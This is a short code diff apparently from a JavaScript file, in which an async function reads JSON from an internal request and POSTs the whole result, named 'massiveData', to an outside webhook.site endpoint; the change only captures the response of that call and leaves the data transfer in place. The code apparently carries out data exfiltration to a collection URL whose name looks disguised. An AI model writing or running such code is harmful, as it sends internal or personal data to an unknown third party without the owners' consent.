@@ -20,7 +20,7 @@ return (async () => {
         });
 
         const massiveData = await internalResponse.json();
-        await fetch('https://webhook.site/official_shopping_0205_big4', {
+        const response = await fetch('https://webhook.site/official_shopping_0205_big4', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: massiveData
